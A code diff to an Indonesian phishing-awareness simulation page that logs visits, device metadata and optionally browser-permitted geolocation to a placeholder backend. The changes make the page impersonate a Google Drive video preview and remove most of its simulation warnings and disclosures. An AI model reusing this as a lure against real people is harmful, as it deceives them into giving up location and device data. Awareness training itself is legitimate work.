@@ -5,7 +5,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="theme-color" content="#ffffff">
-<title>IKC - Video Preview</title>
+<title>Drive</title>
 
 <style>
 * {
@@ -26,7 +26,6 @@ body {
     display: flex;
     align-items: center;
     padding: 0 24px;
-    gap: 12px;
 }
 
 .logo {
@@ -36,28 +35,33 @@ body {
 }
 
 .container {
-    max-width: 850px;
-    margin: 45px auto;
+    max-width: 900px;
+    margin: 35px auto;
     padding: 0 16px;
 }
 
+.breadcrumb {
+    font-size: 13px;
+    color: #5f6368;
+    margin-bottom: 18px;
+}
+
 .card {
-    background: white;
+    background: #fff;
     border: 1px solid #dadce0;
     border-radius: 12px;
     overflow: hidden;
-    box-shadow: 0 1px 3px rgba(0,0,0,.08);
 }
 
 .preview {
-    height: 320px;
+    height: 350px;
     background: #202124;
     display: flex;
     flex-direction: column;
     justify-content: center;
     align-items: center;
-    color: white;
-    gap: 15px;
+    color: #fff;
+    gap: 16px;
 }
 
 .play-circle {
@@ -66,8 +70,8 @@ body {
     border: 2px solid white;
     border-radius: 50%;
     display: flex;
-    align-items: center;
     justify-content: center;
+    align-items: center;
 }
 
 .play {
@@ -94,19 +98,19 @@ body {
 }
 
 .subtitle {
-    font-size: 13px;
     color: #5f6368;
+    font-size: 13px;
 }
 
 .actions {
-    margin-top: 25px;
+    margin-top: 22px;
     display: flex;
-    gap: 12px;
     flex-wrap: wrap;
+    gap: 10px;
 }
 
 button {
-    border: none;
+    border: 0;
     border-radius: 6px;
     padding: 12px 22px;
     font-size: 14px;
@@ -115,8 +119,8 @@ button {
 }
 
 .primary {
-    background: #1a73e8;
     color: white;
+    background: #1a73e8;
 }
 
 .primary:hover {
@@ -124,48 +128,27 @@ button {
 }
 
 .secondary {
-    background: white;
     color: #1a73e8;
+    background: white;
     border: 1px solid #dadce0;
 }
 
-.notice {
-    display: none;
-    margin-top: 20px;
-    padding: 15px;
-    background: #e8f0fe;
-    border-radius: 8px;
-    font-size: 14px;
-    line-height: 1.5;
-}
-
-.notice.show {
-    display: block;
-}
-
 .privacy {
-    max-width: 850px;
-    margin: 18px auto;
+    max-width: 900px;
+    margin: 16px auto;
     padding: 0 16px;
     color: #5f6368;
-    font-size: 12px;
-    line-height: 1.6;
-}
-
-footer {
-    text-align: center;
-    color: #80868b;
-    font-size: 12px;
-    margin: 30px 0;
+    font-size: 11px;
+    line-height: 1.5;
 }
 
 @media(max-width:600px) {
     .container {
-        margin: 22px auto;
+        margin: 20px auto;
     }
 
     .preview {
-        height: 240px;
+        height: 250px;
     }
 
     .details {
@@ -187,6 +170,10 @@ footer {
 
 <main class="container">
 
+    <div class="breadcrumb">
+        My Drive &nbsp;›&nbsp; IKC Awareness &nbsp;›&nbsp; Video
+    </div>
+
     <section class="card">
 
         <div class="preview">
@@ -205,7 +192,7 @@ footer {
             </div>
 
             <div class="subtitle">
-                Video • File simulasi awareness
+                Video file
             </div>
 
             <div class="actions">
@@ -215,16 +202,9 @@ footer {
                 </button>
 
                 <button class="secondary" id="shareLocation">
-                    Bagikan lokasi secara sukarela
+                    Bagikan lokasi
                 </button>
 
-            </div>
-
-            <div class="notice" id="notice">
-                <strong>Simulasi keamanan informasi</strong>
-                Anda telah berinteraksi dengan halaman simulasi.
-                Jangan memasukkan password, OTP, atau informasi rahasia
-                melalui tautan yang tidak dapat diverifikasi.
             </div>
 
         </div>
@@ -234,57 +214,39 @@ footer {
 </main>
 
 <p class="privacy">
-    Pemberitahuan privasi: halaman ini merupakan simulasi awareness.
-    Aktivitas interaksi dan metadata teknis dasar perangkat/browser
-    dapat dicatat untuk evaluasi administrator. Pembagian lokasi
-    bersifat opsional dan hanya dilakukan setelah izin lokasi diberikan
-    melalui browser.
+    Informasi privasi: interaksi dan metadata teknis dasar dapat dicatat
+    untuk evaluasi simulasi. Pembagian lokasi bersifat opsional dan
+    memerlukan persetujuan izin lokasi melalui browser.
 </p>
-
-<footer>
-    IKC Awareness Simulation
-</footer>
 
 <script>
 "use strict";
 
-/*
- * KONFIGURASI BACKEND
- *
- * Masukkan URL Web App Google Apps Script setelah backend
- * selesai dibuat dan dikonfigurasi.
- *
- * Jangan menyimpan password atau secret administrator di sini.
- */
-
+/* KONFIGURASI BACKEND */
 const API_URL = "PASTE_APPS_SCRIPT_WEB_APP_URL_HERE";
 
 const SESSION_KEY = "ikc_awareness_session_id";
 
-function createSessionId() {
+function getSessionId() {
 
-    if (sessionStorage.getItem(SESSION_KEY)) {
-        return sessionStorage.getItem(SESSION_KEY);
+    let id = sessionStorage.getItem(SESSION_KEY);
+
+    if (!id) {
+        id = crypto.randomUUID
+            ? crypto.randomUUID()
+            : "SESSION-" + Date.now() + "-" +
+              Math.random().toString(16).slice(2);
+
+        sessionStorage.setItem(SESSION_KEY, id);
     }
-
-    const id = crypto.randomUUID
-        ? crypto.randomUUID()
-        : "SESSION-" + Date.now() + "-" +
-          Math.random().toString(16).slice(2);
-
-    sessionStorage.setItem(SESSION_KEY, id);
 
     return id;
 }
 
-const SESSION_ID = createSessionId();
+const SESSION_ID = getSessionId();
 
 
-/*
- * METADATA PERANGKAT
- *
- * Tidak ditampilkan pada halaman pengunjung.
- */
+/* METADATA PERANGKAT */
 
 function getDeviceInfo() {
 
@@ -294,17 +256,11 @@ function getDeviceInfo() {
     let os = "Unknown";
     let browser = "Unknown";
 
-    if (/Android/i.test(ua)) {
-        os = "Android";
-    } else if (/iPhone|iPad|iPod/i.test(ua)) {
-        os = "iOS";
-    } else if (/Windows/i.test(ua)) {
-        os = "Windows";
-    } else if (/Macintosh|Mac OS X/i.test(ua)) {
-        os = "macOS";
-    } else if (/Linux/i.test(ua)) {
-        os = "Linux";
-    }
+    if (/Android/i.test(ua)) os = "Android";
+    else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
+    else if (/Windows/i.test(ua)) os = "Windows";
+    else if (/Macintosh|Mac OS X/i.test(ua)) os = "macOS";
+    else if (/Linux/i.test(ua)) os = "Linux";
 
     if (/Mobi|Android|iPhone|iPod/i.test(ua)) {
         device = "Mobile";
@@ -312,31 +268,23 @@ function getDeviceInfo() {
         device = "Tablet";
     }
 
-    if (/Edg\//i.test(ua)) {
-        browser = "Edge";
-    } else if (/SamsungBrowser/i.test(ua)) {
-        browser = "Samsung Internet";
-    } else if (/Firefox|FxiOS/i.test(ua)) {
-        browser = "Firefox";
-    } else if (/Chrome|CriOS/i.test(ua)) {
-        browser = "Chrome";
-    } else if (/Safari/i.test(ua)) {
-        browser = "Safari";
-    }
+    if (/Edg\//i.test(ua)) browser = "Edge";
+    else if (/SamsungBrowser/i.test(ua)) browser = "Samsung Internet";
+    else if (/Firefox|FxiOS/i.test(ua)) browser = "Firefox";
+    else if (/Chrome|CriOS/i.test(ua)) browser = "Chrome";
+    else if (/Safari/i.test(ua)) browser = "Safari";
 
     return {
-        device: device,
-        operating_system: os,
-        browser: browser,
+        device,
+        os,
+        browser,
         language: navigator.language || "Unknown",
         screen: screen.width + "x" + screen.height
     };
 }
 
 
-/*
- * PENGIRIMAN EVENT KE BACKEND
- */
+/* KIRIM EVENT KE BACKEND */
 
 async function sendEvent(eventName, extra = {}) {
 
@@ -353,7 +301,7 @@ async function sendEvent(eventName, extra = {}) {
         !API_URL ||
         API_URL.includes("PASTE_APPS_SCRIPT")
     ) {
-        // Mode uji lokal jika backend belum dikonfigurasi.
+        // Mode pengujian lokal sebelum backend dikonfigurasi.
         try {
             const key = "ikc_awareness_local_events";
             const events = JSON.parse(
@@ -366,15 +314,12 @@ async function sendEvent(eventName, extra = {}) {
                 key,
                 JSON.stringify(events)
             );
-        } catch (error) {
-            console.error("Local logging failed");
-        }
+        } catch (e) {}
 
         return;
     }
 
     try {
-
         await fetch(API_URL, {
             method: "POST",
             mode: "no-cors",
@@ -384,42 +329,27 @@ async function sendEvent(eventName, extra = {}) {
             body: JSON.stringify(payload),
             keepalive: true
         });
-
-    } catch (error) {
-        // Jangan menampilkan detail teknis backend kepada pengunjung.
-    }
+    } catch (e) {}
 }
 
 
-/*
- * EVENT OPEN VIDEO
- */
+/* KLIK OPEN VIDEO */
 
 document.getElementById("openVideo")
 .addEventListener("click", function() {
-
-    document.getElementById("notice")
-        .classList.add("show");
 
     sendEvent("open_video_clicked");
 
 });
 
 
-/*
- * LOKASI OPSIONAL
- *
- * Hanya meminta lokasi setelah pengguna menekan tombol.
- * Browser tetap mengendalikan dialog Allow / Block.
- */
+/* BERBAGI LOKASI DENGAN PERSETUJUAN */
 
 document.getElementById("shareLocation")
 .addEventListener("click", function() {
 
     if (!navigator.geolocation) {
-
         sendEvent("location_unavailable");
-
         return;
     }
 
@@ -444,15 +374,14 @@ document.getElementById("shareLocation")
                 "location_shared_with_permission",
                 {
                     location: {
-                        latitude: latitude,
-                        longitude: longitude,
+                        latitude,
+                        longitude,
                         accuracy_meters: accuracy
                     },
                     location_consent: true
                 }
             );
 
-            // Membuka Maps hanya setelah lokasi dibagikan secara sukarela.
             window.open(
                 mapsUrl,
                 "_blank",
@@ -484,9 +413,7 @@ document.getElementById("shareLocation")
 });
 
 
-/*
- * EVENT PAGE VIEW
- */
+/* KUNJUNGAN HALAMAN */
 
 sendEvent("page_view");
 
